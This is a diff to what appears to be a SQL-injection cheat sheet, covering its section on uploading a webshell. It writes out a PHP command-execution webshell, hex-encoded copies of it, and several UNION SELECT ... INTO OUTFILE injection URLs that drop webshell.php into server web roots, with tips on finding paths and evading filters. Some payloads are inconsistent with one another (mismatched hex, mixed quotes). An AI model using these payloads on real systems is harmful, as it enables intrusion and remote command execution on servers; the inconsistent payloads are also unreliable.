@@ -42,18 +42,25 @@ The bold part is the absolute path: **E:\xampp\htdocs** which is converted to **
 
 ### Uploading webshell
 
+Let's use the following PHP code to inject it into an arbitrary file:
+```php
+<?php system($_GET[‘cmd’]); ?>
+```
+
 Below is the PHP script converted to 0xHEX format:  
-```0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d```
+```0xa3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e```
 
-The converted PHP payload:  
-```“<?php system($_GET[‘cmd’]); ?>”```
+The following queries (same goal, different approach) is to inject this php code into an arbitrary file which we will name it **webshell.php** (for this part you MUST assume/know the absolute path of the file you want to upload, otherwise it won't work. Hint: use [@@slave_load_tmpdir](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/edit/main/Privilege%20Escalation/README.md#finding-absolute-path) to find the temporary directory located in the server).  
 
-The given query is the final payload to upload our simple webshell into webshell.php
-
-```http://domain.com/index.php?id=1' Union Select 1,2,3,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,5,6,7,8,9,10,11,12 into outfile 'E:/xampp/htdocs/webshell.php'-- -```
-
-or like in the first case, you can upload it to **/mysqltmp** (you can also try **/var/mysqltmp** in case something goes wrong):  
-```http://domain.com/index.php?id=1' Union Select 1,2,3,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,5,6,7,8,9,10,11,12 into outfile '/mysqltmp/webshell.php'-- -```
+```sql
+http://domain.com/index.php?id=1' Union Select 1,2,3,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,5,6,7,8,9,10,11,12 into outfile 'E:/xampp/htdocs/webshell.php'-- -
+```  
+```sql
+http://domain.com/index.php?id=1' Union Select 1,2,3,"<?php system($_GET['cmd']); ?>",5,6,7,8,9,10,11,12 into outfile "C:\\xampp\\htdocs\\webshell.php'-- -
+```  
+```sql
+http://domain.com/index.php?id=1' Union Select '' into outfile '/var/www/html/webshell.php' FIELDS TERMINATED BY "<?php system($_GET['cmd']); ?>"
+```  
 
 If WAF comes into the play and makes it unable for you to upload webshell, try using the following concat() functions to load the PHP script:
 ```sql
